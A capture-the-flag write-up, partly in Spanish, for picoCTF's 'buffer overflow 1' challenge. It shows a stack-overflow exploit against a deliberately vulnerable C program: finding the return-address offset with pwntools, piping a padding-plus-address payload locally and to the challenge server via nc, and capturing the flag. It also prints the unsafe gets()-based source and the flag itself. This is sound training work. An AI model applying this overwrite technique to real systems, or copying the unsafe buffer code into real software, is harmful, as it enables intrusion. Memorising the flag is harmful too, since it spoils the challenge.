#  buffer overflow 1

## Objetivo

Control the return address

Additional details will be available after launching your challenge instance.

## Hints

## Solución

```  
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ ls
vuln  vuln.c
                                                                                                                                                                      
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ chmod +x vuln 
                                                                                                                                                                      
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ ./vuln 
Please enter your string: 
xcxzxzxcdz
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
                                                                                                                                                                      
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ ./vuln       
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: segmentation fault  ./vuln
                                                                             
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
Please create 'flag.txt' in this directory with your own debugging flag.
                                                                                  
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ echo 'flag(dumieflag)'>flag.txt                                              
                                                                                  
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | ./vuln 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
flag(dumieflag)
zsh: done                echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | 
zsh: segmentation fault  ./vuln
                                                                                  
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 59150
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_a8284f4f}                                                                                  
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ 
```

- python3
```
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ python3 -c 'from pwn import *'
                                                                                  
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ python3                       
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> cyclic_find(0x6161616c)
44
>>> 'A'*44
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
>>> 
```

```
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ objdump -D vuln -M intel | grep 'win'         
080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>
```

- vuln.c
```
#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <unistd.h>

#include <sys/types.h>

#include "asm.h"

  

#define BUFSIZE 32

#define FLAGSIZE 64

  

void win() {

char buf[FLAGSIZE];

FILE *f = fopen("flag.txt","r");

if (f == NULL) {

printf("%s %s", "Please create 'flag.txt' in this directory with your",

"own debugging flag.\n");

exit(0);

}

  

fgets(buf,FLAGSIZE,f);

printf(buf);

}

  

void vuln(){

char buf[BUFSIZE];

gets(buf);

  

printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());

}

  

int main(int argc, char **argv){

  

setvbuf(stdout, NULL, _IONBF, 0);

gid_t gid = getegid();

setresgid(gid, gid, gid);

  

puts("Please enter your string: ");

vuln();

return 0;

}
```


## Flag

picoCTF{addr3ss3s_ar3_3asy_a8284f4f}

## Notas adicionales

- Desbordar la capacidad del buffer

## Referencias

-   [SIGSEGV](https://es.wikipedia.org/wiki/SIGSEGV)
-   [x86 assembly](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html)